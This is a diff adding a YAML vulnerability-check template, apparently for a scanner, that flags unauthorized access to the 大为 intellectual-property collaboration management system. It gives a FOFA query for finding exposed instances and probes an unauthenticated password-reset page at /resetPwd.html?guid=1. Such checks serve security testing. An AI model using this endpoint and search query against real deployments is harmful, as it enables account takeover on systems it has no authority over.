@@ -1,0 +1,15 @@
+id: poc-yaml-daweisoft-unauthorized-access
+info:
+  name: 大为知识产权协同创新管理系统 未授权访问漏洞
+  severity: medium
+  tags:
+  - 未授权访问
+  finger: 大为知识产权协同创新管理系统
+  fofa: body="大为计算机软件开发有限公司"
+requests:
+- method: GET
+  path: /resetPwd.html?guid=1
+  expression: status_code == 200 && contains(title,"重置密码") && contains(body,"新密码")
+    && contains(body,"两次密码必须一致")
+variables: {}
+transport: http
